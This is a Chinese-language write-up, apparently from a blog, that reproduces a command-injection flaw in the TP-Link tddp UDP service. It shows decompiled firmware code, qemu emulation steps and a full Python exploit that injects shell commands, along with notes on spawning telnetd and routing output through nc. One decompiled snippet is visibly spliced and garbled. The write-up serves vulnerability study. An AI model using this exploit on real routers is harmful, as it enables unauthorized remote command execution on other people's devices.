      int v3; // r0
      uint32_t v4; // r0
      _BYTE *v5; // r3
      __int16 v6; // r2
      _BYTE *v7; // r3
      int v8; // r0
      uint32_t v9; // r0
      _BYTE *v10; // r3
      __int16 v11; // r2
      _BYTE *v12; // r3
      _BYTE *v13; // r3
      int v14; // r3
      int v16; // [sp+Ch] [bp-30h]
      size_t n; // [sp+10h] [bp-2Ch]
      socklen_t addr_len; // [sp+14h] [bp-28h]
      struct sockaddr addr; // [sp+18h] [bp-24h]
      ssize_t v20; // [sp+28h] [bp-14h]
      _BYTE *v21; // [sp+2Ch] [bp-10h]
      unsigned __int8 *v22; // [sp+30h] [bp-Ch]
      int v23; // [sp+34h] [bp-8h]
      v16 = a1;
      v23 = 0;
      addr_len = 16;
      n = 0;
      memset((a1 + 0xB01B), 0, 0xAFC9u);
      memset((v16 + 0x52), 0, 0xAFC9u);
      v22 = (v16 + 0xB01B);
      v21 = (v16 + 0x52);
      v20 = recvfrom(*(v16 + 36), (v16 + 0xB01B), 0xAFC8u, 0, &addr, &addr_len);// 第二个参数就是 buf 的位置
      if ( v20 > 5) - 148] >> (*(heap_space + 9) & 0x1F)) & 1 )
            data_handle(heap_space);        // 函数调用
        }
      }
      sub_16E0C(*(heap_space + 9));
      sub_16C18(heap_space);
      return printf("[%s():%d] tddp task exitn", 94096, 219);
    }
    // sub_16ACC 函数为初始化过程：
    nt __fastcall sub_16ACC(_DWORD *a1)
    {
      _DWORD *v3; // [sp+4h] [bp-10h]
      _DWORD *s; // [sp+8h] [bp-Ch]
      int v5; // [sp+Ch] [bp-8h]
      v3 = a1;
      if ( !a1 )
        return error(-10202, 104096);
      s = calloc(1u, 0x15FE4u);
      if ( !s )
        return error(-10202, 104112);
      v5 = sub_16878(s);
      if ( v5 )
        return v5;
      memset(s + 0xE, 0, 9u);
      memset(s + 0x52, 0, 0xAFC9u);
      memset(s + 0xB01B, 0, 0xAFC9u);
      memset(s + 0x41, 0, 0x11u);
      memset(s, 0, 0x28u);
      s[9] = -1;
      s[8] = 0;
      *v3 = s;
      return 0;
    }
根据堆内存的初始化过程，可以对结构体空间进行表示：
**题目中问到：第几个字节为多少时，会触命令执行漏洞？**
根据 CMD_handle 函数的判断：
接收数据的存储开始位置是在 0xB01B，这里 switch 判断的是 0XB01C 位置，所以相对偏移就是 1，也就是第二个位置。
      v8 = a1;
      v7 = a2;
      v10 = a1 + 0xB01B;
      v9 = a1 + 0x52;
      a1[0x52] = 1;
      switch ( a1[0xB01C] )
      ...
      case 0x31:
      printf("[%s():%d] TDDPv1: receive CMD_FTEST_CONFIGn", 103928, 692);
      v11 = vuln(v8);
那么这里的答案应该是：`CMD_FTEST_CONFIG+0x1+0x31`，但是比赛时怎么提交都是错的…
## 动态调试
这里用 qemu 仿真的方法将固件跑起来，来尝试通过命令注入拿到他的shell。
按照文章的方法，配置好虚拟网卡之后，运行下面的命令将固件模拟起来：
    qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
挂载目录，切换根目录：
    mount -o bind /dev ./squashfs-root/dev/
    mount -t proc /proc/ ./squashfs-root/proc/
    chroot squashfs-root sh
###  启动服务
直接运行 tddp 命令启动 tddp 服务，使用 nmap 的 UDP 扫描端口是开放的。
  * **这里使用 TCP 扫描的话会发现端口是关闭的。**
###  EXP 的编写
首先在发送的数据中，前两个字节必须为 `\0x1\0x31`，中间需要填充 10 个字节， **原因是这里的 v21 指针会后移 12 位**
，因此中间需要填充。
接着就是注入需要的代码：
    payload = 'x01x31'.ljust(12,'x00')
    payload+= "123|%s&&echo ;123"%(command)
  * 这里在 paylaod 中需要注意的是， **在 ; 最后还需要填充字符** ，因为在使用 sscanf 函数进行分割命令后会判断 ; 后面的内容是否为空。
      sscanf(v21, "%[^;];%s", &s, &v12);            // %[^;|&||]
      if ( !s || !v12 )
      {
        printf("[%s():%d] luaFile or configFile len error.n", 98236, 555);
    LABEL_20:
        v14[3] = 3;
        return error(-10303, 94892);
      }
接着使用 UDP 的 socket 的接口进行发送即可：
最后的 exp 如下：
    from pwn import *
    from socket import *
    import sys
    tddp_port = 1040
    recv_port = 12345
    ip = sys.argv[1]
    command = sys.argv[2]
    s_send = socket(AF_INET,SOCK_DGRAM,0)
    s_recv = socket(AF_INET,SOCK_DGRAM,0)
    s_recv.bind(('',12345))
    payload = 'x01x31'.ljust(12,'x00')
    payload+= "123|%s&&echo ;123"%(command)
    s_send.sendto(payload,(ip,tddp_port))
    s_send.close()
    res,addr = s_recv.recvfrom(1024)
    print res
执行一个 uname 看看：
开启 telnetd 服务：
好吧，这里确实已经连接上了，但是这里远程没有用于 telnet 服务的终端，刚好固件又带了 nc，那就使用 nc 来弹一个 shell 吧。
发现 nc 不带弹 shell 的功能。。那只能将命令的内容正向连接来输出了。
如图，在本地监听一个端口，命令执行的结果就会通过 nc 显示在本地。  
至此漏洞复现完毕。
当然注入一个合法的 lua 脚本，让程序去访问之后执行命令也是可以的，参考文章中用的就是这种方法。
## 总结
这个命令执行漏洞拿来练手还是不错的，学到了不少东西。
## 参考文章